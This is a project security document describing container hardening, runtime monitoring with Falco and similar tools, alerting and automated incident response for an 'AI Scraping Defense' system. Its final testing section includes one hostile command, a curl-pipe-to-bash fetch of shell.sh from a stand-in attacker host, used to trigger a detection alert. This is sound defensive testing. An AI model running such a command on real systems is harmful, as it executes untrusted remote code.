# Container Runtime Security

This document describes the container runtime security measures implemented in the AI Scraping Defense system to protect against container breakout, privilege escalation, and runtime attacks.

## Overview

Container runtime security encompasses:
1. **Runtime Policy Enforcement** - Strict security policies at container startup
2. **Behavioral Analysis** - Monitoring container behavior for anomalies
3. **Anomaly Detection** - Detecting unusual system calls, network activity, or file access
4. **Least Privilege** - Running with minimal capabilities and permissions

## Security Hardening Measures

### 1. Non-Root User Execution

All containers run as non-root users:
- Main application: `appuser:appuser`
- Cloud proxy: `cloudproxy:cloudproxy`
- Prompt router: `promptrouter:promptrouter`
- Proxy: `nobody:nobody`

### 2. Read-Only Root Filesystem

Containers should be run with `--read-only` flag with tmpfs mounts for writable directories:

```bash
docker run --read-only \
  --tmpfs /app/logs:rw,noexec,nosuid,size=100m \
  --tmpfs /app/tmp:rw,noexec,nosuid,size=50m \
  --tmpfs /app/cache:rw,noexec,nosuid,size=200m \
  ai-scraping-defense:latest
```

### 3. Capability Dropping

All unnecessary Linux capabilities are dropped:

```bash
docker run --cap-drop=ALL \
  --security-opt=no-new-privileges:true \
  ai-scraping-defense:latest
```

For services requiring network capabilities (fail2ban, suricata), only specific capabilities are added:
- `NET_ADMIN` - For network configuration
- `NET_RAW` - For raw socket access

### 4. Resource Limits

Enforce resource limits to prevent DoS attacks:

```yaml
resources:
  limits:
    memory: "2Gi"
    cpu: "1500m"
  requests:
    memory: "512Mi"
    cpu: "250m"
```

Process limits:
```bash
docker run --pids-limit=100 ai-scraping-defense:latest
```

### 5. Security Context Constraints (Kubernetes)

All Kubernetes deployments enforce Pod Security Standards:

```yaml
securityContext:
  runAsNonRoot: true
  runAsUser: 1000
  runAsGroup: 1000
  fsGroup: 1000
  allowPrivilegeEscalation: false
  readOnlyRootFilesystem: true
  seccompProfile:
    type: RuntimeDefault
  capabilities:
    drop:
      - ALL
```

## Runtime Monitoring Tools

### 1. Falco (Recommended)

Falco provides runtime security monitoring and threat detection.

**Installation:**
```bash
# Helm installation
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm install falco falcosecurity/falco \
  --namespace falco \
  --create-namespace \
  --set falco.grpc.enabled=true \
  --set falco.grpc_output.enabled=true
```

**Key Rules:**
- Detect shell spawned in container
- Detect file modifications in /etc, /usr/bin, /usr/sbin
- Detect privilege escalation attempts
- Detect suspicious network connections
- Detect container drift (files added/modified after startup)

**Example Custom Rule:**
```yaml
- rule: Unexpected Network Connection from Container
  desc: Detect outbound connections to non-whitelisted destinations
  condition: >
    container and fd.type=ipv4 and
    (fd.ip != "10.0.0.0/8" and fd.ip != "172.16.0.0/12" and fd.ip != "192.168.0.0/16")
  output: >
    Suspicious network connection from container
    (user=%user.name command=%proc.cmdline connection=%fd.name container=%container.name)
  priority: WARNING
```

### 2. Tracee (eBPF-based)

Tracee uses eBPF for deep runtime security observability.

**Installation:**
```bash
# Docker deployment
docker run --name tracee --rm -it \
  --pid=host --cgroupns=host --privileged \
  -v /etc/os-release:/etc/os-release-host:ro \
  -v /var/run:/var/run:ro \
  aquasec/tracee:latest
```

**Key Features:**
- Container runtime detection
- Syscall monitoring and filtering
- Kubernetes awareness
- MITRE ATT&CK framework mapping

### 3. Sysdig

Commercial solution with open-source components (sysdig inspect).

```bash
# Open-source sysdig for capture
docker run -it --rm --privileged \
  -v /var/run/docker.sock:/host/var/run/docker.sock \
  -v /dev:/host/dev \
  -v /proc:/host/proc:ro \
  -v /boot:/host/boot:ro \
  -v /usr:/host/usr:ro \
  sysdig/sysdig
```

### 4. Tetragon (Cilium eBPF)

Tetragon provides runtime security enforcement using eBPF.

```bash
# Kubernetes deployment
kubectl apply -f https://raw.githubusercontent.com/cilium/tetragon/main/install/kubernetes/tetragon.yaml
```

**Policy Example:**
```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: detect-privilege-escalation
spec:
  kprobes:
  - call: "commit_creds"
    syscall: false
    args:
    - index: 0
      type: "nop"
    selectors:
    - matchActions:
      - action: Post
      matchArgs:
      - index: 0
        operator: "NotEqual"
        values:
        - "0"
```

## Runtime Policy Enforcement

### Docker Compose Example

```yaml
services:
  app:
    image: ai-scraping-defense:latest
    read_only: true
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL
    pids_limit: 100
    mem_limit: 2g
    cpus: 1.5
    tmpfs:
      - /app/logs:rw,noexec,nosuid,size=100m
      - /app/tmp:rw,noexec,nosuid,size=50m
      - /app/cache:rw,noexec,nosuid,size=200m
```

### Kubernetes PodSecurityPolicy Example

```yaml
apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: ai-defense-restricted
spec:
  privileged: false
  allowPrivilegeEscalation: false
  requiredDropCapabilities:
    - ALL
  volumes:
    - 'configMap'
    - 'emptyDir'
    - 'projected'
    - 'secret'
    - 'downwardAPI'
    - 'persistentVolumeClaim'
  hostNetwork: false
  hostIPC: false
  hostPID: false
  runAsUser:
    rule: 'MustRunAsNonRoot'
  seLinux:
    rule: 'RunAsAny'
  supplementalGroups:
    rule: 'RunAsAny'
  fsGroup:
    rule: 'RunAsAny'
  readOnlyRootFilesystem: true
```

## Behavioral Analysis

### Anomaly Detection Metrics

Monitor these container metrics for anomalies:

1. **System Calls**
   - Unexpected syscalls (e.g., `ptrace`, `mount`, `setuid`)
   - High frequency of failed syscalls
   - Syscalls from unexpected processes

2. **Network Activity**
   - Connections to unexpected IPs/domains
   - High outbound data transfer
   - Port scanning behavior
   - Reverse shell patterns

3. **File System Activity**
   - Modifications to read-only directories
   - Binary execution from unusual locations
   - Sensitive file access (/etc/passwd, /etc/shadow)
   - Container drift (post-startup file changes)

4. **Process Activity**
   - Shell spawned inside container
   - Privilege escalation attempts
   - Unexpected child processes
   - Process injection

### Baseline Establishment

Establish behavioral baselines during initial deployment:

```bash
# Record normal behavior with Falco
falco --stats-interval 60s --support | grep -A 10 "Stats"

# Analyze with sysdig
sysdig -pc -c topprocs_cpu container.name=ai-defense-app
sysdig -pc -c topfiles_bytes container.name=ai-defense-app
```

## Security Monitoring Integration

### Prometheus Metrics

Export container security metrics:

```yaml
# Falco Exporter
- job_name: 'falco'
  static_configs:
    - targets: ['falco-exporter:9376']

# Container metrics
- job_name: 'cadvisor'
  static_configs:
    - targets: ['cadvisor:8080']
```

### Alert Rules

```yaml
groups:
  - name: container_security
    interval: 30s
    rules:
      - alert: ContainerPrivilegeEscalation
        expr: falco_events{rule="Privilege Escalation"} > 0
        for: 1m
        labels:
          severity: critical
        annotations:
          summary: "Privilege escalation detected in container"
          description: "Container {{ $labels.container_name }} attempted privilege escalation"

      - alert: ContainerAnomalousNetworkActivity
        expr: rate(container_network_transmit_bytes_total[5m]) > 100000000
        for: 5m
        labels:
          severity: warning
        annotations:
          summary: "Unusual network activity from container"
          description: "Container {{ $labels.name }} has high outbound traffic"

      - alert: ContainerUnexpectedProcess
        expr: falco_events{rule="Unexpected Process"} > 0
        for: 1m
        labels:
          severity: warning
        annotations:
          summary: "Unexpected process spawned in container"
          description: "Container {{ $labels.container_name }} spawned unexpected process"
```

## Incident Response

### Detection Workflow

1. **Falco/Tracee Alert** → Triggers webhook to escalation engine
2. **Escalation Engine** → Analyzes event with ML models and LLM
3. **Automated Response** → Based on severity:
   - Low: Log and monitor
   - Medium: Rate limit container network
   - High: Quarantine container
   - Critical: Kill container and alert security team

### Response Actions

```python
# Example automated response in escalation engine
async def handle_container_security_event(event: SecurityEvent):
    severity = await analyze_event(event)
    
    if severity == "critical":
        # Kill the container
        await docker_client.containers.get(event.container_id).kill()
        # Block source IP
        await add_to_blocklist(event.source_ip)
        # Alert security team
        await send_alert("critical", event)
    
    elif severity == "high":
        # Quarantine: limit network and resources
        await docker_client.containers.get(event.container_id).update(
            cpus=0.1,
            mem_limit="100m",
            network_mode="none"
        )
        await send_alert("high", event)
    
    # Always log
    audit_logger.log_security_event(event)
```

## Security Scanning in CI/CD

Integrate runtime security scanning in the build pipeline:

```yaml
# .github/workflows/container-security.yml
- name: Run Trivy vulnerability scanner
  uses: aquasecurity/trivy-action@master
  with:
    image-ref: 'ai-scraping-defense:latest'
    format: 'sarif'
    output: 'trivy-results.sarif'
    severity: 'CRITICAL,HIGH'

- name: Run Grype vulnerability scanner
  uses: anchore/scan-action@v3
  with:
    image: 'ai-scraping-defense:latest'
    fail-build: true
    severity-cutoff: high

- name: Run Snyk Container scan
  uses: snyk/actions/docker@master
  env:
    SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
  with:
    image: ai-scraping-defense:latest
    args: --severity-threshold=high
```

## Best Practices

1. **Minimize Attack Surface**
   - Use distroless or minimal base images
   - Remove unnecessary packages and binaries
   - Disable unused network protocols

2. **Immutable Infrastructure**
   - Never modify running containers
   - Deploy new containers for updates
   - Use read-only filesystems

3. **Network Isolation**
   - Use Kubernetes NetworkPolicies
   - Implement zero-trust networking
   - Segment container networks

4. **Secret Management**
   - Never embed secrets in images
   - Use Kubernetes Secrets or external vaults
   - Rotate secrets regularly

5. **Regular Updates**
   - Scan images daily for vulnerabilities
   - Rebuild images with security patches
   - Keep base images up to date

6. **Audit and Compliance**
   - Enable comprehensive logging
   - Retain logs for forensics
   - Regular security audits
   - Compliance validation (CIS Docker Benchmark)

## Testing Runtime Security

```bash
# Test read-only filesystem
docker run --rm -it --read-only ai-scraping-defense:latest bash
# Try: touch /test.txt (should fail)

# Test capability drop
docker run --rm -it --cap-drop=ALL ai-scraping-defense:latest bash
# Try: ping 8.8.8.8 (should fail - no NET_RAW)

# Test no-new-privileges
docker run --rm -it --security-opt=no-new-privileges:true ai-scraping-defense:latest bash
# Try: sudo su (should fail)

# Test with Falco
falco -r /etc/falco/rules.d/container_security.yaml -M 60
docker run --rm ai-scraping-defense:latest bash -c "curl attacker.com/shell.sh | bash"
# Should trigger Falco alert
```

## References

- [Falco Documentation](https://falco.org/docs/)
- [Tracee Documentation](https://aquasecurity.github.io/tracee/)
- [NIST SP 800-190: Container Security](https://csrc.nist.gov/publications/detail/sp/800-190/final)
- [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker)
- [Kubernetes Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [Container Runtime Security Best Practices](https://kubernetes.io/docs/concepts/security/runtime-class/)
